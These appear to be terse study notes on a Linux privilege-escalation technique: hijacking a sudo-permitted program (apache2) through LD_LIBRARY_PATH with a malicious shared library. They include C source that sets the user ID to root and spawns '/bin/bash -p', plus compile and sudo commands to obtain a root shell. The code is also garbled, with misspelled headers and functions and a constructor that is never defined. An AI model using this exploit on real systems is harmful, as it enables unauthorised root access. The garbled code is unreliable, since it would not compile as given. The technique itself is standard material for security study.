LD_LIBRARY_PATH

The LD LIBRARY PATH environment variable contains a set of directories where shared libraries are searched for first.

The idd command can be used to print the shared libraries used by a program: ldd /usr/sbin/apache2

By creating a shared library with the same name as one used by a program, and setting LD_LIBRARY PATH to its parent directory, the program will load our shared library instead.


library_path.c
___________________________
#include <studio.h>
#include <stdlib.h>

static void hijact() __attribute__((constructor));

void_init()
{
unset_env("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}

Commands to Run Script
__________________________________________________________________
ldd /usr/sbin/apache2	(apache2 is in sudo -l)  	we use any shared file from apache

gcc -o libcrypt.so.1 -shared -fPIC library_path.c  	libcrypt.c is one of the shared file by apache	

sudo LD_LIBRARY_PATH=. apache2